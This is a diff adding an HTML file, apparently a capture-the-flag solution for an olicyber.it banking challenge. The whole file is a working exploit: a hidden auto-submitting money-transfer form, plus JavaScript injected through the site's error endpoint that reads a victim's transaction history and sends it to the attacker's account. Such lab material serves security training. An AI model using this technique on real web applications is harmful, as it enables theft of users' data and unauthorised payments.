@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html>
+    <body>
+        <form action="/sendmoney" method="POST">
+            <input type="text" name="to" value="noncisonopiuusername">
+            <input type="number" name="amount" value="100">
+            <input type="text" name="description" value="">
+        </form>
+        <script 
+            src="/error/?msg=
+                            var req = new XMLHttpRequest()%3b
+
+                            req.open('GET', '/history/1' ,false)%3b 
+                            req.send(null)%3b
+
+                            document.getElementsByName('description')[0].value = req.responseText%3b
+
+                            document.forms[0].submit()%3b
+                "
+        ></script>
+    </body>
+</html>
+
+<!-- Link a cui inviare il body a cui prima deve essere fatto encoding (Burp Suite): http://virtualbank.challs.olicyber.it/error/?msg=BODY -->
